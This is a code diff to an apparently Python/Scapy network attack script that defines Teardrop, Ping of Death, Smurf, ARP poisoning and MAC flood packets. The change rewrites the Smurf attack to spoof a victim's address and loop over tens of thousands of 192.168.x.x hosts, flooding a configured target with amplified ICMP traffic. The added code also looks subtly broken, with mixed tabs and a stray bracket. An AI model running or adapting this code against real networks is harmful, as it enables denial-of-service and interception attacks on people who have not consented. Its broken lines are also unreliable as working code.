@@ -63,8 +63,8 @@ def TeardropAttack(ipDestination):
 def PingOfDeath(ipDestination):
     packet = IP(dst=ipDestination) / ICMP() / ("X" * 65000)
     return packet
-def Smurf(ipSource, ipDestination):
-    packet = IP(src=ipSource, dst=ipDestination) / ICMP() / config.LONG_PAYLOAD
+def Smurf(victim, spoof):
+    packet = IP(src=victim, dst=spoof) / ICMP() / config.LONG_PAYLOAD
     return packet
 
 # Man in the Middle Attacks
@@ -184,8 +184,12 @@ def RunARPPoisoning():
     print("complete.")
     return "RunARPPoisoning"
 def RunSmurf():
-    packet = Smurf("192.168.1.1", "192.168.62.60")
-    send(packet) 
+	for i in range(40, 254):
+		for j in range(0, 254):
+			packet = Smurf(config.targetIPDestination,
+			  "192.168."+str(i)+"."+str(j)])
+			send(packet) 
+			print(packet)
 def RunMACFlood():
     packet = MACFlood()
     print(packet)
